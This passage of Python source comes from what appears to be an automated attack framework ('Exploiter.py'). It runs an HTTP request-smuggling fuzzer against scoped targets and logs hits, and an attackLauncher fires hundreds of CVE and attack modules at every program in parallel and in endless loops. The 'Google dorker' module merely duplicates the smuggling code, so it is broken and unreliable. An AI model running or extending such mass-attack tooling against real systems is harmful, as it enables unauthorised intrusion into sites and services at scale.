            getoutput(f"rm -f /tmp/{fileNAME}")
            
            if len(smuggResults) > 0:
              vulnPath = fullURLTxt
              fullPayload = smuggResults
              print(f"Found Vunerable!!! : {vulnPath}")
              inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
              
              screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
              
            updateTargetDC(progName,progAdr,targetURI,myKey)
          except Exception as e:
            print(f"EXCEPTION: {e}")
          except:
            # updateTargetDC(progName,progAdr,targetURI,myKey)
            pass
                                  
          bar.next()
        bar.finish()
    except Exception as e:
      print(f"EXCEPTION: {e}")
    except:
      pass

# DORKER MODULE, Updates dork list, tries list on every possible target
def googDorker(progScope):
  myKey = "8d413e6f5651c9dde1fa8b234dd04941"
  # listOfTargets = customSQLQuery(dbFile,f"select progAdr from SCOPES where progAdr like '*.%' and progAdr not like '%.*%' and (keyID IS NULL OR keyID not like \"%{myKey}%\")")
  #       if len(listOfTargets) != 0:
  #         listOfTargets = [row[0] for row in listOfTargets]
  #         if len(listOfTargets) != 0:
  #           bar2 = IncrementalBar('transScopesTargets.py => queryTARMethod()', max=len(listOfTargets))
  #           # system("clear")
  #           for tar in listOfTargets:
  #             progAdr = tar
  #             # if not doScopeDC(progName,progAdr,myKey): # if operation is not done before!
  #             mainProgAdr = tar
  #             # delete *. from the domain:
  #             tar = tar.replace("*.","")
  vulnCat = "GoogleDork"
  vulnName = "googerZ"
  severity = "P1/P2/P3/P4"
  vulnDsc = "Google Dorker => Weaponizing Google for Attacks"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  candidateURI = '/'
  prog = progScope

  if prog == "":
    exit()
  elif prog == "exit":
    return False
  elif prog == "all":
    programs = listdir(dbPath)
    random.shuffle(programs)
    bar = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(programs))
    for progName in programs:
      try:
        conn = dbConnect(progName)
        cur = conn.cursor()
        cur.execute(f'''
                    SELECT progAdr 
                    FROM SCOPES 
                    where progAdr like "*.%" and progAdr not like "%.*%"
                    AND (keyID IS NULL OR keyID not like "%{myKey}%")
                    ORDER BY RANDOM() limit 1
                    ''')
        results = cur.fetchall()
        dbDisconnect(conn)
        
        if len(results) != 0:
          bar2 = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(results))
          for item in results:
            progAdr = item[0]

            try:
              fullURLTxt = targetURI
              # headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
              
              # generate filename to store smuggz
              fileNAME = random.random()
              # execute smuggler to fuzz what is smuggable
              getoutput(f"python3 /opt/smuggler/smuggler.py -u {fullURLTxt} --method POST -q -l /tmp/{fileNAME}")
              # check if the smuggling was done and we have results
              smuggResults = getoutput(f"cat /tmp/{fileNAME} | grep CRITICAL")
              getoutput(f"rm -f /tmp/{fileNAME}")  
              
              if len(smuggResults) > 0:
                vulnPath = fullURLTxt
                fullPayload = smuggResults
                print(f"Found Vunerable!!! : {vulnPath}")
                inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
                
                screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
                
              updateTargetDC(progName,progAdr,targetURI,myKey)
            except Exception as e:
              print(f"EXCEPTION: {e}")
            except:
              # updateTargetDC(progName,progAdr,targetURI,myKey)
              pass
                                    
            bar2.next()
          bar2.finish()
      except Exception as e:
        print(f"EXCEPTION: {e}")
      except:
        pass
      bar.next()
    bar.finish()
  else:
    progName = prog
    try:
      conn = dbConnect(progName)
      cur = conn.cursor()
      cur.execute(f'''
                  SELECT progAdr 
                  FROM SCOPES 
                  where progAdr like "*.%" and progAdr not like "%.*%"
                  AND (keyID IS NULL OR keyID not like "%{myKey}%")
                  ORDER BY RANDOM() limit 1
                  ''')
      results = cur.fetchall()
      dbDisconnect(conn)
      
      if len(results) != 0:
        bar2 = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(results))
        for item in results:
          progAdr = item[0]

        try:
          fullURLTxt = targetURI
          # headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
          
          # generate filename to store smuggz
          fileNAME = random.random()
          # execute smuggler to fuzz what is smuggable
          getoutput(f"python3 /opt/smuggler/smuggler.py -u {fullURLTxt} --method POST -q -l /tmp/{fileNAME}")
          # check if the smuggling was done and we have results
          smuggResults = getoutput(f"cat /tmp/{fileNAME} | grep CRITICAL")
          getoutput(f"rm -f /tmp/{fileNAME}")
          
          if len(smuggResults) > 0:
            vulnPath = fullURLTxt
            fullPayload = smuggResults
            print(f"Found Vunerable!!! : {vulnPath}")
            inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
            
            screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
            
          updateTargetDC(progName,progAdr,targetURI,myKey)
        except Exception as e:
          print(f"EXCEPTION: {e}")
        except:
          # updateTargetDC(progName,progAdr,targetURI,myKey)
          pass
                                
        bar.next()
      bar.finish()
    except Exception as e:
      print(f"EXCEPTION: {e}")
    except:
      pass

# This modules looks into URLS and crawled subdomains for SECRETS
def secretExposer(progScope):
  pass

# This module checks aws buckets for read/write authorization problems
def awsScanner(progScope):
  pass





#**************************************#
#**************************************#
#**************************************#
#**************************************#
#**************************************#
# Split attacks modules into 4 parts and run multiLauncher on them
# def attackModuleHandler(attackList):
  # for attackName in attackList:
  #   multiLauncher(attackName)
  
# Launches one attack on all programs multithreaded
def multiLauncher(attackName):
  # print(f"launched ATTACK =====> {attackName}")
  targetList = listdir(dbPath)
  random.shuffle(targetList)
  # multiprocessing(attackName, targetList, 10, "Exploiter.py => multiLauncher()")
  # multithreading(attackName, targetList, 5, "Exploiter.py => multiLauncher()")
  multithreading(attackName, targetList, 30, "Exploiter.py => multiLauncher()")
  
  # print("Sleeping 1 SECONDS and trying again")
  # sleep(1)
  # multiLauncher(attackName)

  #***********#
    # for tar in targetList:
    #   attackName(tar)
      
    # if attN == "subDomTaker":
    #   print("Sleeping 10 MINUTES and trying again")
    #   sleep(600)
    #   # multiprocessing(multiLauncher, attackList, 1, "Exploiter.py => attackLauncher()")
    #   # attackLauncher("subDomTaker","all")
    #   multiLauncher(attackName,attN)
    
    # elif attN == "corsPloiter":
    #   print("Sleeping 10 MINUTES and trying again")
    #   sleep(600)
    #   # multiprocessing(multiLauncher, attackList, 1, "Exploiter.py => attackLauncher()")
    #   # attackLauncher("corsPloiter","all")
    #   multiLauncher(attackName,attN)
    
    # elif attN == "attMOD62":
    #   print("Sleeping 10 MINUTES and trying again")
    #   sleep(600)
    #   # multiprocessing(multiLauncher, attackList, 1, "Exploiter.py => attackLauncher()")
    #   # attackLauncher("corsPloiter","all")
    #   multiLauncher(attackName,attN)

# MAIN LAUNCHER WHICH BLINDLY LAUNCHES EVERY ATTACK ON EVERY PROGRAM
def attackLauncher(attackName,progName):
  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
  attackList = [
    CVE6,CVE5,CVE4,CVE3,CVE2,CVE1,infoDisclo13,infoDisclo12,infoDisclo11,infoDisclo10,infoDisclo9,infoDisclo8,infoDisclo7,infoDisclo1,infoDisclo3,infoDisclo4,infoDisclo2,infoDisclo5,infoDisclo6,CVE7,CVE8,CVE9,CVE10,CVE11,CVE12,CVE13,CVE14,CVE15,CVE16,CVE17,CVE18,CVE19,CVE20,CVE21,CVE22,CVE23,CVE24,CVE25,CVE26,CVE27,CVE28,CVE29,CVE30,CVE31,CVE32,CVE33,CVE34,CVE35,CVE36,CVE37,CVE38,CVE39,CVE40,CVE41,CVE42,CVE43,CVE44,CVE45,CVE46,CVE47,CVE48,CVE49,CVE50,CVE51,CVE52,CVE53,CVE54,CVE55,CVE56,CVE57,CVE58,CVE59,CVE60,CVE61,CVE62,CVE63,CVE64,CVE65,CVE66,CVE67,CVE68,CVE69,CVE70,CVE71,CVE72,CVE73,CVE74,CVE75,CVE76,CVE77,CVE78,CVE79,CVE80,CVE81,CVE83,CVE84,CVE85,CVE86,CVE87,CVE88,CVE89,CVE90,CVE91,CVE92,CVE93,CVE94,CVE95,CVE96,CVE97,CVE98,attMOD0,attMOD1,attMOD2,attMOD3,attMOD4,attMOD5,attMOD6,attMOD7,attMOD8,attMOD9,attMOD10,attMOD11,attMOD12,attMOD13,attMOD14,attMOD15,attMOD16,attMOD17,attMOD18,attMOD19,attMOD20,attMOD21,attMOD22,attMOD23,attMOD24,attMOD25,attMOD26,attMOD27,attMOD28,attMOD29,attMOD30,attMOD31,attMOD32,attMOD33,attMOD34,attMOD35,attMOD36,attMOD37,attMOD38,attMOD39,attMOD40,attMOD41,attMOD42,attMOD43,attMOD44,attMOD45,attMOD46,attMOD47,attMOD48,attMOD49,attMOD50,attMOD51,attMOD52,attMOD53,attMOD54,attMOD55,attMOD56,attMOD57,attMOD58,attMOD59,attMOD60,attMOD61,attMOD62,attMOD63,attMOD64,attMOD65,attMOD66,attMOD67,attMOD68,attMOD69,attMOD70,attMOD71,attMOD72,attMOD73,attMOD75,attMOD76,attMOD77,attMOD78,attMOD79,attMOD80,attMOD81,attMOD82,attMOD83,attMOD84,attMOD85,attMOD86,attMOD87,attMOD88,attMOD89,attMOD90,attMOD91,attMOD92,attMOD93,attMOD94,attMOD95,attMOD96,attMOD97,attMOD98,attMOD99,attMOD100,attMOD101,attMOD102,attMOD103,attMOD104,attMOD105,attMOD106,attMOD107,attMOD108,attMOD109,attMOD110,attMOD111,attMOD112,attMOD113,attMOD114,attMOD115,attMOD116,attMOD117,attMOD118,attMOD119,attMOD120,attMOD121,attMOD122,attMOD123,attMOD124,attMOD125,attMOD126,attMOD127,attMOD128,attMOD129,attMOD130,attMOD131,attMOD132,attMOD133,attMOD134,attMOD135,attMOD136,attMOD137,attMOD138,attMOD139,attMOD140,attMOD141,attMOD142,attMOD143,attMOD144,attMOD145,attMOD146,attMOD147,attMOD148,attMOD149,attMOD150,attMOD151,attMOD152,attMOD153,attMOD154,attMOD155,attMOD156,attMOD157,attMOD158,attMOD159,attMOD160,attMOD161,attMOD162,attMOD163,attMOD164,attMOD165,attMOD166,attMOD167,attMOD168,attMOD169,attMOD170,attMOD171,attMOD172,attMOD173,attMOD174,attMOD175,attMOD176,attMOD177,attMOD178,attMOD179,attMOD180,attMOD181,attMOD182,attMOD183,attMOD184,attMOD185,attMOD186,attMOD187,attMOD188,attMOD189,attMOD190,attMOD191,attMOD192,attMOD193,attMOD194,attMOD195,attMOD196,attMOD197,attMOD198,attMOD199,attMOD200,attMOD201,attMOD202,attMOD203,attMOD204,attMOD205,attMOD206,attMOD207,attMOD208,attMOD209,attMOD210,attMOD211,attMOD212,attMOD213,attMOD214,attMOD215,attMOD216,attMOD217,attMOD218,attMOD219,attMOD220,attMOD221,attMOD222,attMOD223,attMOD224,attMOD225,attMOD226,attMOD227,attMOD228,attMOD229,attMOD230,attMOD231,attMOD232,attMOD233,attMOD234,attMOD235,attMOD236,attMOD237,attMOD238,attMOD239,attMOD240,attMOD241,attMOD242,attMOD243,attMOD244,attMOD245,attMOD246,attMOD247,attMOD248,attMOD249,attMOD250,attMOD251,attMOD252,attMOD253,attMOD254,attMOD255,attMOD256,attMOD257,attMOD258,attMOD259,attMOD260,attMOD261,attMOD262,attMOD263,attMOD264,attMOD265,attMOD266,attMOD267,attMOD268,attMOD269,attMOD270,attMOD271,attMOD272,attMOD273,attMOD274,attMOD275,attMOD276,attMOD277,attMOD278,attMOD279,attMOD280,attMOD281,attMOD282,attMOD283,attMOD284,attMOD285,attMOD286,attMOD287,attMOD288,attMOD289,attMOD290,attMOD291,attMOD292,attMOD293,attMOD294,attMOD295,attMOD296,attMOD297,attMOD299,attMOD300,attMOD301,attMOD302,attMOD303,attMOD304,attMOD305,attMOD306,attMOD298]
  
  attackExcludes = [attMOD244,attMOD224,attMOD204,attMOD127,attMOD118,attMOD95,attMOD87,attMOD69,attMOD62,attMOD51,attMOD48,attMOD44,attMOD42,attMOD25]
  
  attackList = [x for x in attackList if x not in attackExcludes]
  
  listSingleCapacity = ['subDomTaker','corsPloiter']

  if progName == "all":
    if attackName == "" or attackName == "all":
      # Lets all launch attacks
      requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
      
      # Running attacks one by one
      # since we have keyID system, no duplicates will happen
      # so running all each time.

      # UPDATE THIS LIST AS SOON AS A NEW ATTACK IS CREATED !
      # infoDisclo5("all")
      
      # The list of attacks that can run on only on a single program like google dorker
      # That's because google will block us if we query multiple programs at the same time.
      
      # Going for attack executions
      random.shuffle(attackList)
      attackList.reverse()
      # input("BEFORE multiprocessing")
      # multiprocessing(multiLauncher, attackList, 5, "Exploiter.py => attackLauncher()")
      
      try:
        multiprocessing(multiLauncher, attackList, 4, "Exploiter.py => attackLauncher()")
      except:
        pass    
     
      # n = int(len(attackList)/4) # for example list of 8 elements => n = 2
      # splitedAttackModules = [attackList[i:i+n] for i in range(0, len(attackList), n)]
      # # print(f"ATTACK MODULES : {splitedAttackModules}")
      # multiprocessing(attackModuleHandler, splitedAttackModules, 5, "Exploiter.py => attackLauncher()")
      
      # for funcCall in attackList:
      #   try:
      #     multiLauncher(funcCall)
      #   except:
      #     pass
        
      # GRAB STATS WHEN ALL DONE
      # statsDump()
      # attackLauncher("all","all")
      


      # Loop back again on all attacks
      # if attackName == "" or attackName == "all":
      # Prevent aggressive runs
      print("SLEEPING FOR 10 SECONDS AND LOOPING BACK AGAIN...")
      sleep(10)
      # attackLauncher("all","all")
    
    else:
      # Let's launch the attack requested
      try:
        # progScope = input("all? or name program:\n")
        if progName == "all":
          multiLauncher(globals()[attackName])
          
          # if attackName == "subDomTaker":
          #   print("Sleeping 10 MINUTES and trying again")
          #   sleep(10)
          #   # multiprocessing(multiLauncher, attackList, 1, "Exploiter.py => attackLauncher()")
          #   # attackLauncher("subDomTaker","all")
          #   multiLauncher(globals()[attackName])
          
          # elif attackName == "corsPloiter":
          #   print("Sleeping 10 MINUTES and trying again")
          #   sleep(10)
          #   # multiprocessing(multiLauncher, attackList, 1, "Exploiter.py => attackLauncher()")
          #   # attackLauncher("corsPloiter","all")
          #   multiLauncher(globals()[attackName])
            
        else:
          eval(attackName)(progName)
      # except Exception as e:
        # print(f"EXCEPTION: {e}")
      except:
        pass
    
  else: # Want to run all attacks on one program :D
    if attackName == "all":
            
      # Going for attack executions
      random.shuffle(attackList)
      attackList.reverse()
      
      for funcCall in attackList:
        try:
          funcCall(progName)
        except:
          pass
    else:
      # eval((attackName),(progName))
      # input("BEFORE EXEC")
      # input(f"exec : {globals()[attackName]} {progName}")
      while True:
        globals()[attackName](progName)
        print("Sleeping 2 seconds")
        sleep(2)
      



#**************************************#
#**************************************#
#**************************************#
#**************************************#
#**************************************#
